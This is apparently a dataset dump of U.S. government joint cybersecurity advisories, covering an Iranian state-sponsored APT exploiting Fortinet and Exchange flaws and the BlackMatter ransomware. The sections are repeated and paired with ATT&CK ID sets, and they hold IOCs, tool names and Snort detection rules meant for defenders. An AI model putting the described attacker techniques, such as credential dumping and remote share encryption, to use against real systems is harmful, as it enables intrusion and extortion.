d7982ffe09f947e5b4237c9477af73a034114af03968e3c4ce462a029f072a5a


Vhash:
017057555d6d141az25!z


Authentihash:
40ed1568fef4c5f9d03c370b2b9b06a3d0bd32caca1850f509223b3cee2225ea


Imphash:
91802a615b3a5c4bcc05bc5f66a5b219


SSDEEP:
196608:/qTLyGAlLrOt8enYfrhkhBnfY0NIPvoOQiE:GLHiLrSfY5voO


Note:

Identical to “frps.exe” available at: 
			https://github[.]com/fatedier/frp/releases/download/v0.33.0/frp_0.33.0_windows_amd64.zip
 




 
APPENDIX B: MITRE ATT&CK TACTICS AND TECHNIQUES
Table 2 identifies MITRE ATT&CK Tactics and techniques observed in this activity.
Table 2: Observed Tactics and Techniques



Tactic
Technique




Resource Development [TA0042]

Obtain Capabilities: Malware [T1588.001]




Obtain Capabilities: Tool [T1588.002]



Initial Access [TA0001]

Exploit Public-Facing Application [T1190]




Execution [TA0002]


Scheduled Task/Job: Scheduled Task [T1053.005]



Persistence [TA0003]

Create Account: Local Account [T1136.001]



Create Account: Domain Account [T1136.002]


Privilege Escalation [TA0004]
 



Credential Access [TA0006]

 


Collection [TA0009]

Archive Collected Data: Archive via Utility [T1560.001]



Exfiltration [TA0010]
 


Impact [TA0040]
Data Encrypted for Impact [T1486]




Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at https://www.fbi.gov/contact-us/field-offices, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov. Australian organizations can visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and access alerts and advisories.

Revisions

November 17, 2021: Initial Version|November 19, 2021: Added STIX files






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0006', 'TA0003', 'T1190', 'TA0009', 'T1560.001', 'T1136.001', 'TA0040', 'T1486', 'TA0042', 'TA0004', 'T1588.001', 'TA0001', 'T1053.005', 'T1136.002', 'T1588.002', 'TA0010', 'TA0002'}","




Summary

Actions to Take Today to Protect Against Iranian State-Sponsored Malicious Cyber Activity
• Immediately patch software affected by the following vulnerabilities: CVE-2021-34473, 2018-13379, 2020-12812, and 2019-5591.
• Implement multi-factor authentication.
• Use strong, unique passwords.v
Note: this advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, version 10. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
This joint cybersecurity advisory is the result of an analytic effort among the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the Australian Cyber Security Centre (ACSC), and the United Kingdom’s National Cyber Security Centre (NCSC) to highlight ongoing malicious cyber activity by an advanced persistent threat (APT) group that FBI, CISA, ACSC, and NCSC assess is associated with the government of Iran. FBI and CISA have observed this Iranian government-sponsored APT group exploit Fortinet vulnerabilities since at least March 2021 and a Microsoft Exchange ProxyShell vulnerability since at least October 2021 to gain initial access to systems in advance of follow-on operations, which include deploying ransomware. ACSC is also aware this APT group has used the same Microsoft Exchange vulnerability in Australia.
The Iranian government-sponsored APT actors are actively targeting a broad range of victims across multiple U.S. critical infrastructure sectors, including the Transportation Sector and the Healthcare and Public Health Sector, as well as Australian organizations. FBI, CISA, ACSC, and NCSC assess the actors are focused on exploiting known vulnerabilities rather than targeting specific sectors. These Iranian government-sponsored APT actors can leverage this access for follow-on operations, such as data exfiltration or encryption, ransomware, and extortion.
This advisory provides observed tactics and techniques, as well as indicators of compromise (IOCs) that FBI, CISA, ACSC, and NCSC assess are likely associated with this Iranian government-sponsored APT activity.
The FBI, CISA, ACSC, and NCSC urge critical infrastructure organizations to apply the recommendations listed in the Mitigations section of this advisory to mitigate risk of compromise from Iranian government-sponsored cyber actors.
For a downloadable copy of IOCs, see AA21-321A.stix.
For more information on Iranian government-sponsored malicious cyber activity, see us-cert.cisa.gov/Iran.
Click here for a PDF version of this report.

Technical Details

Threat Actor Activity
Since at least March 2021, the FBI and CISA have observed Iranian government-sponsored APT actors leverage Microsoft Exchange and Fortinet vulnerabilities to target a broad range of victims across multiple critical infrastructure sectors in furtherance of malicious activities. Observed activity includes the following.

In March 2021, the FBI and CISA observed these Iranian government-sponsored APT actors scanning devices on ports 4443, 8443, and 10443 for Fortinet FortiOS vulnerability CVE-2018-13379, and enumerating devices for FortiOS vulnerabilities CVE-2020-12812 and CVE-2019-5591. The Iranian Government-sponsored APT actors likely exploited these vulnerabilities to gain access to vulnerable networks. Note: for previous FBI and CISA reporting on this activity, refer to Joint Cybersecurity Advisory: APT Actors Exploit Vulnerabilities to Gain Initial Access for Future Attacks.
In May 2021, these Iranian government-sponsored APT actors exploited a Fortigate appliance to access a webserver hosting the domain for a U.S. municipal government. The actors likely created an account with the username elie to further enable malicious activity. Note: for previous FBI reporting on this activity, refer to FBI FLASH: APT Actors Exploiting Fortinet Vulnerabilities to Gain Initial Access for Malicious Activity.
In June 2021, these APT actors exploited a Fortigate appliance to access environmental control networks associated with a U.S.-based hospital specializing in healthcare for children. The Iranian government-sponsored APT actors likely leveraged a server assigned to IP addresses 91.214.124,.,143 and 162.55.137,.,20—which FBI and CISA judge are associated with Iranian government cyber activity—to further enable malicious activity against the hospital’s network. The APT actors accessed known user accounts at the hospital from IP address 154.16.192,.,70, which FBI and CISA judge is associated with government of Iran offensive cyber activity.
As of October 2021, these APT actors have leveraged a Microsoft Exchange ProxyShell vulnerability—CVE-2021-34473—to gain initial access to systems in advance of follow-on operations.

ACSC considers that this APT group has also used the same Microsoft Exchange vulnerability (CVE-2021-34473) in Australia.
MITRE ATT&CK Tactics and Techniques
FBI, CISA, ACSC, and NCSC assess the following tactics and techniques are associated with this activity.
Resource Development,
The APT actors have used the following malicious and legitimate tools, for a variety of tactics across the enterprise spectrum.

Mimikatz for credential theft,
WinPEAS for privilege escalation,
SharpWMI (Windows Management Instrumentation)
WinRAR for archiving collected data,
FileZilla for transferring files,

Initial Access,
The Iranian government-sponsored APT actors gained initial access by exploiting vulnerabilities affecting Microsoft Exchange servers (CVE-2021-34473) and Fortinet devices (CVE-2018-13379, CVE-2020-12812, and CVE-2019-5591),.
Execution,
The Iranian government-sponsored APT actors may have made modifications to the Task Scheduler,. These modifications may display as unrecognized scheduled tasks or actions. Specifically, the below established tasks may be associated with this activity:

SynchronizeTimeZone
GoogleChangeManagement
MicrosoftOutLookUpdater
MicrosoftOutLookUpdateSchedule

Persistence,
The Iranian government-sponsored APT actors may have established new user accounts on domain controllers, servers, workstations, and active directories,. Some of these accounts appear to have been created to look similar to other existing accounts on the network, so specific account names may vary per organization. In addition to unrecognized user accounts or accounts established to masquerade as existing accounts, the following account usernames may be associated with this activity:

Support
Help
elie
WADGUtilityAccount

Exfiltration,
The FBI and CISA observed outbound File Transfer Protocol (FTP) transfers over port 443.
Impact,
The APT actors forced BitLocker activation on host networks to encrypt data,. The corresponding threatening notes were either sent to the victim or left on the victim network as a .txt file. The ransom notes included ransom demands and the following contact information. 

sar_addr@protonmail,.,com
WeAreHere@secmail,.,pro
nosterrmann@mail,.,com
nosterrmann@protonmail,.,com 

Detection
The FBI, CISA, ACSC, and NCSC recommend that organizations using Microsoft Exchange servers and Fortinet investigate potential suspicious activity in their networks. 

Search for IOCs. Collect known-bad IOCs and search for them in network and host artifacts. Note: refer to Appendix A for IOCs.
Investigate exposed Microsoft Exchange servers (both patched and unpatched) for compromise. 
Investigate changes to Remote Desktop Protocol (RDP), firewall, and Windows Remote Management (WinRM) configurations that may allow attackers to maintain persistent access. 
Review domain controllers, servers, workstations, and active directories for new or unrecognized user accounts.
Review Task Scheduler for unrecognized scheduled tasks. Additionally, manually review operating-system defined or recognized scheduled tasks for unrecognized “actions” (for example, review the steps each scheduled task is expected to perform).
Review antivirus logs for indications they were unexpectedly turned off.
Look for WinRAR and FileZilla in unexpected locations. 

Note: for additional approaches on uncovering malicious cyber activity, see joint advisory Technical Approaches to Uncovering and Remediating Malicious Activity, authored by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom. 

Mitigations

The FBI, CISA, ACSC, and NCSC urge network defenders to apply the following mitigations to reduce the risk of compromise by this threat.
Patch and Update Systems

Install updates/patch operating systems, software, and firmware as soon as updates/patches are released. 
Immediately patch software affected by vulnerabilities identified in this advisory: CVE-2021-34473, CVE-2018-13379, CVE-2020-12812, and CVE-2019-5591.

Evaluate and Update Blocklists and Allowlists

Regularly evaluate and update blocklists and allowlists.
If FortiOS is not used by your organization, add the key artifact files used by FortiOS to your organization’s execution blocklist. Any attempts to install or run this program and its associated files should be prevented.

Implement and Enforce Backup and Restoration Policies and Procedures

Regularly back up data, air gap, and password protect backup copies offline.
Ensure copies of critical data are not accessible for modification or deletion from the system where the data resides. 
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, secure location (e.g., hard drive, storage device, the cloud). 

Implement Network Segmentation

Implement network segmentation to restrict adversary’s lateral movement. 

Secure User Accounts

Audit user accounts with administrative privileges and configure access controls under the principles of least privilege and separation of duties. 
Require administrator credentials to install software. 

Implement Multi-Factor Authentication

Use multifactor authentication where possible, particularly for webmail, virtual private networks (VPNs), and accounts that access critical systems. 

Use Strong Passwords

Require all accounts with password logins to have strong, unique passwords.

Secure and Monitor RDP and other Potentially Risky Services

If you use RDP, restrict it to limit access to resources over internal networks.
Disable unused remote access/RDP ports.
Monitor remote access/RDP logs. 

Use Antivirus Programs

Install and regularly update antivirus and anti-malware software on all hosts. 

Secure Remote Access

Only use secure networks and avoid using public Wi-Fi networks. 
Consider installing and using a VPN for remote access.

Reduce Risk of Phishing

Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails

Resources

For more information on Iranian government-sponsored malicious cyber activity, see us-cert.cisa.gov/Iran. 
For information and resources on protecting against and responding to ransomware, refer to StopRansomware.gov, a centralized, whole-of-government webpage providing ransomware resources and alerts.
The joint advisory from the cybersecurity authorities of Australia, Canada, New Zealand, the United Kingdom, and the United States: Technical Approaches to Uncovering and Remediating Malicious Activity provides additional guidance when hunting or investigating a network and common mistakes to avoid in incident handling.
CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats, including ransomware. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate attack vectors.
The U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.
ACSC can provide tailored cyber security advice and assistance, reporting, and incident response support at cyber.gov.au and via 1300 292 371 (1300 CYBER1).

Appendix A: Indicators of Compromise
IP addresses and executables files are listed below. For a downloadable copy of IOCs, see AA21-321A.stix.
IP Addresses

91.214.124,.,143 
162.55.137,.,20 
154.16.192,.,70

Executable Files 
Executable files observed in this activity are identified in table 1.
Table 1: Executable Files 

 
APPENDIX B: MITRE ATT&CK TACTICS AND TECHNIQUES
Table 2 identifies MITRE ATT&CK Tactics and techniques observed in this activity.
Table 2: Observed Tactics and Techniques


Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at https://www.fbi.gov/contact-us/field-offices, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov. Australian organizations can visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and access alerts and advisories.

Revisions

November 17, 2021: Initial Version|November 19, 2021: Added STIX files






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-321a
59,"




Summary

Actions You Can Take Now to Protect Against BlackMatter Ransomware
• Implement and enforce backup and restoration policies and procedures.
• Use strong, unique passwords.
• Use multi-factor authentication.
• Implement network segmentation and traversal monitoring.
Note: this advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, version 9. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
This joint Cybersecurity Advisory was developed by the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the National Security Agency (NSA) to provide information on BlackMatter ransomware. Since July 2021, BlackMatter ransomware has targeted multiple U.S. critical infrastructure entities, including two U.S. Food and Agriculture Sector organizations.
This advisory provides information on cyber actor tactics, techniques, and procedures (TTPs) obtained from a sample of BlackMatter ransomware analyzed in a sandbox environment as well from trusted third-party reporting. Using embedded, previously compromised credentials, BlackMatter leverages the Lightweight Directory Access Protocol (LDAP) and Server Message Block (SMB) protocol to access the Active Directory (AD) to discover all hosts on the network. BlackMatter then remotely encrypts the hosts and shared drives as they are found.
Ransomware attacks against critical infrastructure entities could directly affect consumer access to critical infrastructure services; therefore, CISA, the FBI, and NSA urge all organizations, including critical infrastructure organizations, to implement the recommendations listed in the Mitigations section of this joint advisory. These mitigations will help organizations reduce the risk of compromise from BlackMatter ransomware attacks.
Click here for a PDF version of this report.

Technical Details

Overview
First seen in July 2021, BlackMatter is ransomware-as-a-service (Raas) tool that allows  the ransomware's developers to profit from cybercriminal affiliates (i.e., BlackMatter actors) who deploy it against victims. BlackMatter is a possible rebrand of DarkSide, a RaaS which was active from September 2020 through May 2021. BlackMatter actors have attacked numerous U.S.-based organizations and have demanded ransom payments ranging from $80,000 to $15,000,000 in Bitcoin and Monero.
Tactics, Techniques, and Procedures
This advisory provides information on cyber actor TTPs obtained from the following sample of BlackMatter ransomware, which was analyzed in a sandbox environment, as well as from trusted third parties: SHA-256: 706f3eec328e91ff7f66c8f0a2fb9b556325c153a329a2062dc85879c540839d. (Note: click here to see the sample’s page on VirusTotal.)
The BlackMatter variant uses embedded admin or user credentials that were previously compromised and NtQuerySystemInformation and EnumServicesStatusExW to enumerate running processes and services, respectively. BlackMatter then uses the embedded credentials in the LDAP and SMB protocol to discover all hosts in the AD and the srvsvc.NetShareEnumAll Microsoft Remote Procedure Call (MSRPC) function to enumerate each host for accessible shares. Notably, this variant of BlackMatter leverages the embedded credentials and SMB protocol to remotely encrypt, from the original compromised host, all discovered shares’ contents, including ADMIN$, C$, SYSVOL, and NETLOGON.
BlackMatter actors use a separate encryption binary for Linux-based machines and routinely encrypt ESXi virtual machines. Rather than encrypting backup systems, BlackMatter actors wipe or reformat backup data stores and appliances.
Table 1 maps BlackMatter’s capabilities to the MITRE ATT&CK for Enterprise framework, based on the analyzed variant and trusted third-party reporting.
Table 1: Black Matter Actors and Ransomware TTPs




Tactic


Technique 


Procedure 






Persistence [TA0003]


External Remote Services [T1133]


BlackMatter leverages legitimate remote monitoring and management software and remote desktop software, often by setting up trial accounts, to maintain persistence on victim networks. 




Credential Access [TA0006]


OS Credential Dumping: LSASS Memory [T1003.001]


BlackMatter harvests credentials from Local Security Authority Subsystem Service (LSASS) memory using procmon.




Discovery [TA0007]


Remote System Discovery [T1018]


BlackMatter leverages LDAP and SMB protocol to discover all hosts in the AD.




Process Discovery [T1057]


BlackMatter uses NtQuerySystemInformation to enumerate running processes.




System Service Discovery [T1007]


BlackMatter uses EnumServicesStatusExW to enumerate running services on the network.




Lateral Movement [TA0008]


Remote Services: SMB/Windows Admin Shares [T1021.002]


BlackMatter uses srvsvc.NetShareEnumAll MSRPC function to enumerate and SMB to connect to all discovered shares, including ADMIN$, C$, SYSVOL, and NETLOGON.




Exfiltration [TA0010]


Exfiltration Over Web Service [T1567]


BlackMatter attempts to exfiltrate data for extortion.




Impact [TA0040]


Data Encrypted for Impact [T1486]


BlackMatter remotely encrypts shares via SMB protocol and drops a ransomware note in each directory.




Disk Wipe [T1561]


BlackMatter may wipe backup systems.




Detection Signatures
The following Snort signatures may be used for detecting network activity associated with BlackMatter activity.
Intrusion Detection System Rule:
alert tcp any any -> any 445 ( msg:""BlackMatter remote encryption attempt"";  content:""|01 00 00 00 00 00 05 00 01 00|"";  content:""|2e 00 52 00 45 00 41 00 44 00 4d 00 45 00 2e 00 74 00|""; distance:100; detection_filter: track by_src, count 4, seconds 1; priority:1; sid:11111111111; )
Inline Intrusion Prevention System Rule:
alert tcp any any -> any 445 ( msg:""BlackMatter remote encryption attempt"";  content:""|01 00 00 00 00 00 05 00 01 00|"";  content:""|2e 00 52 00 45 00 41 00 44 00 4d 00 45 00 2e 00 74 00|""; distance:100; priority:1; sid:10000001; )
rate_filter gen_id 1, sig_id 10000001, track by_src, count 4, seconds 1, new_action reject, timeout 86400

Mitigations

CISA, the FBI, and NSA urge network defenders, especially for critical infrastructure organizations, to apply the following mitigations to reduce the risk of compromise by BlackMatter ransomware:
Implement Detection Signatures

Implement the detection signatures identified above. These signatures will identify and block placement of the ransom note on the first share that is encrypted, subsequently blocking additional SMB traffic from the encryptor system for 24 hours. 

Use Strong Passwords

Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts.) to have strong, unique passwords. Passwords should not be reused across multiple accounts or stored on the system where an adversary may have access. Note: devices with local administrative accounts should implement a password policy that requires strong, unique passwords for each individual administrative account. 

Implement Multi-Factor Authentication

Require multi-factor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.

Patch and Update Systems

Keep all operating systems and software up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats.

Limit Access to Resources over the Network

Remove unnecessary access to administrative shares, especially ADMIN$ and C$. If ADMIN$ and C$ are deemed operationally necessary, restrict privileges to only the necessary service or user accounts and perform continuous monitoring for anomalous activity.
Use a host-based firewall to only allow connections to administrative shares via SMB from a limited set of administrator machines. 

Implement Network Segmentation and Traversal Monitoring
Adversaries use system and network discovery techniques for network and system visibility and mapping. To limit an adversary from learning the organization’s enterprise environment, limit common system and network discovery techniques by taking the following actions.

Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. 
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host. 

Use Admin Disabling Tools to Support Identity and Privileged Access Management
If BlackMatter uses compromised credentials during non-business hours, the compromise may not be detected. Given that there has been an observed increase in ransomware attacks during non-business hours, especially holidays and weekends, CISA, the FBI, and NSA recommend organizations:

Implement time-based access for accounts set at the admin-level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the AD level when the account is not in direct need. When the account is needed, individual users submit their requests through an automated process that enables access to a system, but only for a set timeframe to support task completion. 
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities that run from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally. 

Implement and Enforce Backup and Restoration Policies and Procedures

Maintain offline backups of data, and regularly maintain backup and restoration. This practice will ensure the organization will not be severely interrupted, have irretrievable data, or be held up by a ransom demand.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted) and covers the entire organization’s data infrastructure. 

CISA, the FBI, and NSA urge critical infrastructure organizations to apply the following additional mitigations to reduce the risk of credential compromise.

Disable the storage of clear text passwords in LSASS memory.
Consider disabling or limiting New Technology Local Area Network Manager (NTLM) and WDigest Authentication.
Implement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft: Manage Windows Defender Credential Guard for more information). For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA). 
Minimize the AD attack surface to reduce malicious ticket-granting activity. Malicious activity such as “Kerberoasting” takes advantage of Kerberos’ Ticket Granting service and can be used to obtain hashed credentials that attackers attempt to crack.

Set a strong password policy for service accounts.
Audit Domain Controllers to log successful Kerberos Ticket-Granting Service requests and ensure the events are monitored for anomalous activity.  



Refer to the CISA-Multi-State information and Sharing Center (MS-ISAC) Joint Ransomware Guide for general mitigations to prepare for and reduce the risk of compromise by ransomware attacks. 
Note: critical infrastructure organizations with industrial control systems/operational technology networks should review joint CISA-FBI Cybersecurity Advisory AA21-131A: DarkSide Ransomware: Best Practices for Preventing Business Disruption from Ransomware Attacks for more mitigations, including mitigations to reduce the risk of severe business or functional degradation should their entity fall victim to a ransomware attack. 
Responding to Ransomware Attacks
If a ransomware incident occurs at your organization, CISA, the FBI, and NSA recommend:

Following the Ransomware Response Checklist on p. 11 of the CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
Scanning backups. If possible, scan backup data with an antivirus program to check that it is free of malware.
Reporting incidents immediately to the FBI at a local FBI Field Office, CISA at us-cert.cisa.gov/report, or the U.S. Secret Service at a U.S. Secret Service Field Office. 
Applying incident response best practices found in the joint Advisory, Technical Approaches to Uncovering and Remediating Malicious Activity, developed by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.

Note: CISA, the FBI, and NSA strongly discourage paying a ransom to criminal actors. Paying a ransom may embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or may fund illicit activities. Paying the ransom also does not guarantee that a victim’s files will be recovered.
Resources

For more information and resources on protecting against and responding to ransomware, refer to StopRansomware.gov, a centralized, whole-of-government webpage providing ransomware resources and alerts.
CISA’s Ransomware Readiness Assessment (RRA) is a no-cost self-assessment based on a tiered set of practices to help organizations better assess how well they are equipped to defend and recover from a ransomware incident. 
CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats, including ransomware. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate attack vectors.


Contact Information

Victims of ransomware should report it immediately to CISA at us-cert.cisa.gov/report, a local FBI Field Office, or U.S. Secret Service Field Office. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. For NSA client requirements or general cybersecurity inquiries, contact the NSA Cybersecurity Requirements Center at 410-854-4200 or Cybersecurity_Requests@nsa.gov.
This document was developed by CISA, the FBI, and NSA in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations.
Note: the information you have accessed is being provided “as is” for informational purposes only. CISA, the FBI, and NSA do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by CISA, the FBI, or NSA.

Revisions

October 18, 2021: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0006', 'TA0003', 'TA0008', 'T1567', 'T1561', 'TA0040', 'T1003.001', 'T1018', 'T1021.002', 'T1486', 'T1007', 'T1057', 'T1133', 'TA0010', 'TA0007'}","




Summary

Actions You Can Take Now to Protect Against BlackMatter Ransomware
• Implement and enforce backup and restoration policies and procedures.
• Use strong, unique passwords.
• Use multi-factor authentication.
• Implement network segmentation and traversal monitoring.
Note: this advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, version 9. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
This joint Cybersecurity Advisory was developed by the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the National Security Agency (NSA) to provide information on BlackMatter ransomware. Since July 2021, BlackMatter ransomware has targeted multiple U.S. critical infrastructure entities, including two U.S. Food and Agriculture Sector organizations.
This advisory provides information on cyber actor tactics, techniques, and procedures (TTPs) obtained from a sample of BlackMatter ransomware analyzed in a sandbox environment as well from trusted third-party reporting. Using embedded, previously compromised credentials, BlackMatter leverages the Lightweight Directory Access Protocol (LDAP) and Server Message Block (SMB) protocol to access the Active Directory (AD) to discover all hosts on the network. BlackMatter then remotely encrypts the hosts and shared drives as they are found.
Ransomware attacks against critical infrastructure entities could directly affect consumer access to critical infrastructure services; therefore, CISA, the FBI, and NSA urge all organizations, including critical infrastructure organizations, to implement the recommendations listed in the Mitigations section of this joint advisory. These mitigations will help organizations reduce the risk of compromise from BlackMatter ransomware attacks.
Click here for a PDF version of this report.

Technical Details

Overview
First seen in July 2021, BlackMatter is ransomware-as-a-service (Raas) tool that allows  the ransomware's developers to profit from cybercriminal affiliates (i.e., BlackMatter actors) who deploy it against victims. BlackMatter is a possible rebrand of DarkSide, a RaaS which was active from September 2020 through May 2021. BlackMatter actors have attacked numerous U.S.-based organizations and have demanded ransom payments ranging from $80,000 to $15,000,000 in Bitcoin and Monero.
Tactics, Techniques, and Procedures
This advisory provides information on cyber actor TTPs obtained from the following sample of BlackMatter ransomware, which was analyzed in a sandbox environment, as well as from trusted third parties: SHA-256: 706f3eec328e91ff7f66c8f0a2fb9b556325c153a329a2062dc85879c540839d. (Note: click here to see the sample’s page on VirusTotal.)
The BlackMatter variant uses embedded admin or user credentials that were previously compromised and NtQuerySystemInformation and EnumServicesStatusExW to enumerate running processes and services, respectively. BlackMatter then uses the embedded credentials in the LDAP and SMB protocol to discover all hosts in the AD and the srvsvc.NetShareEnumAll Microsoft Remote Procedure Call (MSRPC) function to enumerate each host for accessible shares. Notably, this variant of BlackMatter leverages the embedded credentials and SMB protocol to remotely encrypt, from the original compromised host, all discovered shares’ contents, including ADMIN$, C$, SYSVOL, and NETLOGON.
BlackMatter actors use a separate encryption binary for Linux-based machines and routinely encrypt ESXi virtual machines. Rather than encrypting backup systems, BlackMatter actors wipe or reformat backup data stores and appliances.
Table 1 maps BlackMatter’s capabilities to the MITRE ATT&CK for Enterprise framework, based on the analyzed variant and trusted third-party reporting.
Table 1: Black Matter Actors and Ransomware TTPs

Detection Signatures
The following Snort signatures may be used for detecting network activity associated with BlackMatter activity.
Intrusion Detection System Rule:
alert tcp any any -> any 445 ( msg:""BlackMatter remote encryption attempt"";  content:""|01 00 00 00 00 00 05 00 01 00|"";  content:""|2e 00 52 00 45 00 41 00 44 00 4d 00 45 00 2e 00 74 00|""; distance:100; detection_filter: track by_src, count 4, seconds 1; priority:1; sid:11111111111; )
Inline Intrusion Prevention System Rule:
alert tcp any any -> any 445 ( msg:""BlackMatter remote encryption attempt"";  content:""|01 00 00 00 00 00 05 00 01 00|"";  content:""|2e 00 52 00 45 00 41 00 44 00 4d 00 45 00 2e 00 74 00|""; distance:100; priority:1; sid:10000001; )
rate_filter gen_id 1, sig_id 10000001, track by_src, count 4, seconds 1, new_action reject, timeout 86400

Mitigations

CISA, the FBI, and NSA urge network defenders, especially for critical infrastructure organizations, to apply the following mitigations to reduce the risk of compromise by BlackMatter ransomware:
Implement Detection Signatures

Implement the detection signatures identified above. These signatures will identify and block placement of the ransom note on the first share that is encrypted, subsequently blocking additional SMB traffic from the encryptor system for 24 hours. 

Use Strong Passwords

Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts.) to have strong, unique passwords. Passwords should not be reused across multiple accounts or stored on the system where an adversary may have access. Note: devices with local administrative accounts should implement a password policy that requires strong, unique passwords for each individual administrative account. 

Implement Multi-Factor Authentication

Require multi-factor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.

Patch and Update Systems

Keep all operating systems and software up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats.

Limit Access to Resources over the Network

Remove unnecessary access to administrative shares, especially ADMIN$ and C$. If ADMIN$ and C$ are deemed operationally necessary, restrict privileges to only the necessary service or user accounts and perform continuous monitoring for anomalous activity.
Use a host-based firewall to only allow connections to administrative shares via SMB from a limited set of administrator machines. 

Implement Network Segmentation and Traversal Monitoring
Adversaries use system and network discovery techniques for network and system visibility and mapping. To limit an adversary from learning the organization’s enterprise environment, limit common system and network discovery techniques by taking the following actions.

Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. 
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host. 

Use Admin Disabling Tools to Support Identity and Privileged Access Management
If BlackMatter uses compromised credentials during non-business hours, the compromise may not be detected. Given that there has been an observed increase in ransomware attacks during non-business hours, especially holidays and weekends, CISA, the FBI, and NSA recommend organizations:

Implement time-based access for accounts set at the admin-level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the AD level when the account is not in direct need. When the account is needed, individual users submit their requests through an automated process that enables access to a system, but only for a set timeframe to support task completion. 
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities that run from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally. 

Implement and Enforce Backup and Restoration Policies and Procedures

Maintain offline backups of data, and regularly maintain backup and restoration. This practice will ensure the organization will not be severely interrupted, have irretrievable data, or be held up by a ransom demand.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted) and covers the entire organization’s data infrastructure. 

CISA, the FBI, and NSA urge critical infrastructure organizations to apply the following additional mitigations to reduce the risk of credential compromise.

Disable the storage of clear text passwords in LSASS memory.
Consider disabling or limiting New Technology Local Area Network Manager (NTLM) and WDigest Authentication.
Implement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft: Manage Windows Defender Credential Guard for more information). For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA). 
